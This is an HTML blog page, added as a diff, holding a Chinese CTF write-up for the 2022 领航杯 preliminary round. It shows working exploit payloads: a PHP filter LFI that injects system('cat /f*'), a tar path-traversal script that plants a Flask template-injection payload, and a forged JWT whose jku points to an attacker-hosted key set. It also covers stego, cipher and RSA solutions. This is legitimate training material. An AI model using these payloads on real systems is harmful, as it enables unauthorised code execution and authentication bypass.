@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Xi4nb3i" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      领航杯2022初赛write up 
+      
+      
+    
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.svg">
+    <link rel="icon" href="/images/favicon.svg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/common.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+
+  
+
+  
+    
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Xi4nb3i's blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <a href="/">Xi4nb3i</a>
+</div>
+
+
+      <p class="links">
+  
+    <a title="archives" target="" href="/archives/">
+      <i class="iconfont icon-bookmark"></i>
+    </a>
+  
+    <a title="github" target="_blank" href="https://github.com/xianbeil">
+      <i class="iconfont icon-github"></i>
+    </a>
+  
+</p>
+
+
+      <div class="main">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    }
+  };
+</script>
+
+<div class="post">
+  <h3 class="date">
+    Aug 25, 2022
+  </h3>
+  <h1>
+    领航杯2022初赛write up
+  </h1>
+  <div class="content markdown-body">
+    <h1 id="linkgame"><a href="#linkgame" class="headerlink" title="linkgame"></a>linkgame</h1><p>发现可以lfi的地方，伪协议读取index.php源码</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823155748-kyzig1n.png" alt="image">​</p>
+<p>尝试直接去include session文件，反正可以写入session</p>
+<p>后来发现可以读到session文件，并且写入的数据是base64编码保存的，就尝试用解码的过滤器去把他带出来，当然前面要添加垃圾字符来保证是4的倍数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /?file=php:<span class="comment">//filter/convert.base64-decode/resource=../../../tmp/sess_150ak6n4vclbpnm5263qpi5c25&amp;name=aabcdabcdabcdabddddcdabcdabcdabcdabcdabcdabcdabcdabcd&lt;?php+system(&#x27;cat+/f*&#x27;);?&gt; HTTP/1.1</span></span><br><span class="line">Host: <span class="number">39.106</span>.<span class="number">148.107</span>:<span class="number">16698</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">99.0</span>.<span class="number">4844.51</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=150ak6n4vclbpnm5263qpi5c25</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 14</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823155943-vk8isi2.png" alt="image">​</p>
+<p>HongKe{ac59054a40ea53757b7a0c8d99875027}</p>
+<h1 id="TarSlip"><a href="#TarSlip" class="headerlink" title="TarSlip"></a>TarSlip</h1><p>报错查看到部分源码</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823143954-nirgqse.png" alt="image">​</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823160132-g54kjso.png" alt="image"></p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823160448-eq8p8us.png" alt="image">​</p>
+<p>存在Zip Slip漏洞，可以用它来覆盖原有的上级路径下的文件</p>
+<p>在解压的时候覆盖原有的文件</p>
+<p>Flask开启了调试模式，尝试覆盖模板index.html，达到模板注入rce</p>
+<p>网上找了脚本生成tar</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;1.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line"></span><br><span class="line">    info = tarfile.TarInfo(<span class="string">&quot;../../../templates/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    deserialization_payload = (</span><br><span class="line">        <span class="string">&#x27;&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;/flag&quot;).read() &#125;&#125;&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    info.size = <span class="built_in">len</span>(deserialization_payload)</span><br><span class="line">    info.mode = <span class="number">0o444</span>  <span class="comment"># So it cannot be overwritten</span></span><br><span class="line"></span><br><span class="line">    tar.addfile(info, io.BytesIO(deserialization_payload.encode()))</span><br><span class="line">    tar.close()</span><br></pre></td></tr></table></figure>
+
+<p>上传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.gz&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    res = requests.post(</span><br><span class="line">        <span class="string">&quot;http://39.106.148.107:16743/api/untar&quot;</span>, files=&#123;<span class="string">&quot;file&quot;</span>: file.read()&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>rce成功</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823145343-4wrmu9x.png" alt="image">​</p>
+<p>CnHongKe{49d2c218cbdbbee6381c7f9601bf0205}</p>
+<h1 id="jwt2"><a href="#jwt2" class="headerlink" title="jwt2"></a>jwt2</h1><p>随便注册一个用户，分析jwt</p>
+<p>头部是这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jku&quot;</span>: <span class="string">&quot;http://localhost:5000/static/styles/jwks.json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><code>/static/styles/jwks.json</code>保存本地</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153430-rc3mnur.png" alt="image">​</p>
+<p>在<a target="_blank" rel="noopener" href="https://mkjwk.org/%E4%B8%AD%E7%94%9F%E6%88%90keypair">https://mkjwk.org/中生成keypair</a></p>
+<p>用生成的n替换掉n</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153410-ohzf5k2.png" alt="image">​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;keys&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;kty&quot;</span>: <span class="string">&quot;RSA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;use&quot;</span>: <span class="string">&quot;sig&quot;</span>,</span><br><span class="line">            <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;demo&quot;</span>,</span><br><span class="line">            <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">            <span class="string">&quot;n&quot;</span>: <span class="string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span>,</span><br><span class="line">            <span class="string">&quot;e&quot;</span>: <span class="string">&quot;AQAB&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>放在vps上，目录开http服务</p>
+<p>然后构造jwt</p>
+<p>公钥和私钥从刚刚生成的里面复制</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153537-5jgnujx.png" alt="image">​</p>
+<p>这里jku替换成vps上的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jku&quot;</span>: <span class="string">&quot;http://120.27.248.81/jwks.json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153329-fauzdj3.png" alt="image">​</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153314-6cxdair.png" alt="image">​</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153551-lycj7rf.png" alt="image">​</p>
+<p>CnHongKe{3d5d119ab41e94e256d24f021823746e}</p>
+<h1 id="小明的困惑"><a href="#小明的困惑" class="headerlink" title="小明的困惑"></a>小明的困惑</h1><p>拿到图片发现里面隐藏了东西，先foremost分离出来</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image002-20220823174635-mqk6hb8.jpg">​</p>
+<p>然后zsteg看一下通道，发现里面有个eg_information</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image004-20220823174635-ccowszj.jpg">​</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image006-20220823174635-pft4ttd.jpg">​</p>
+<p>然后用pngcheck检测png图片是否被修改过，果然图片是被动过的</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image008-20220823174635-ljq5xbj.jpg">​</p>
+<p>修改ihdr得到原始图片</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image010-20220823174635-hsxz3an.jpg">​</p>
+<p>发现右下角有个find_str，与之前得到的拼在一起可以得到压缩包的密码：find_steg_information，打开压缩包</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image012-20220823174635-qz4lhee.jpg">​</p>
+<p>发现行数呈现一定的规律</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image014-20220823174635-nlj75oa.jpg">​</p>
+<p>猜测为二进制，在线转码得到：CnH0n9Ke</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image016-20220823174635-m0b7yx5.jpg" alt="IMG_256">​</p>
+<p>据题意要md5的值</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image018-20220823174635-latgtyf.jpg">​</p>
+<p>所以最后的flag为：</p>
+<p>CnHongKe{62912e0cb10240c1f323c719b7ec5706}</p>
+<h1 id="SmallIp"><a href="#SmallIp" class="headerlink" title="SmallIp"></a>SmallIp</h1><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image002-20220823174718-87p2akf.jpg">​</p>
+<p>如图可知字母为rot13解决，数字为ascll表对应值与7异或处理，其他符号用ascll表对应值与6异或。</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image004-20220823174718-wgckr46.jpg">​</p>
+<p>这个nj &#x3D;<br>“PaUbatXr}P7ate3gh63ge7af{“为加密过后的结果</p>
+<p>经解密得CnHongKe{C0ngr4tu14tr0ns}</p>
+<p>所以结果为此</p>
+<p>验证得</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image006-20220823174718-suxiu0z.jpg">​</p>
+<h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n= <span class="number">18068084654503166459678256330702863359058855857364297657967966547721339739774006329918220663022306569505094844488394089767989656632513885150147468647129320316884121695436759043299519486096468548569125022874657850436656755056592057603683592308393335091313125510527778277584046865412410461354443376761977198663827654733137098378331471195448635250255391138122238570361223672500510336508097682979064499210197237414629707976646241474531359676074143979974285720290865649993620043169639863845529538686458568022824251216003309356279073057734111752994714199138627394600571994085388795698092627546703002648115505809394107286143</span></span><br><span class="line">e= <span class="number">7</span></span><br><span class="line">c= <span class="number">12638092982695661510801150389916683505333379755571736707014609281536097225309558432845064087780222143856194730895008362619433554338827184174867917468438857696106608248037932751836798649128943244807603793586431297829198511854055960619667075145609763782148006924165793533190668777929738448780729325061197428046010754750547992393229482720438349717059808374022743576774097271594850957513597564719686802663578631452072033770243212715027502576569751164626421</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_to_ans</span>(<span class="params">m</span>):  <span class="comment"># 求出明文m后将m转化成文字</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">while</span> m != <span class="number">0</span>:</span><br><span class="line">        m, b = <span class="built_in">divmod</span>(m, <span class="number">256</span>)</span><br><span class="line">        l.insert(<span class="number">0</span>, <span class="built_in">chr</span>(b))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(l))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"><span class="built_in">print</span>(gmpy2.iroot(c, e))</span><br><span class="line">small_msg(e,n,c)</span><br><span class="line">m_to_ans(<span class="number">27739419203610272465846297626078343194214077317795017373626235261</span>)</span><br></pre></td></tr></table></figure>
+
+<p>CnHongKe{Th1s_i5_vEry_e45y}</p>
+
+  </div>
+  
+    
+      <a id="older" class="blog-nav" href="/2022/08/25/20220825%E5%8D%9A%E5%AE%A2%E6%95%B4%E6%94%B9/">OLDER&nbsp;&gt;</a>
+      
+        
+          <a id="newer" class="blog-nav" href="/2022/08/28/20220829%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1v3/">&lt;&nbsp;NEWER</a>
+          
+            
+</div>
+        <div class="footer">
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+
+
+    </div>
+  </body>
+</html>
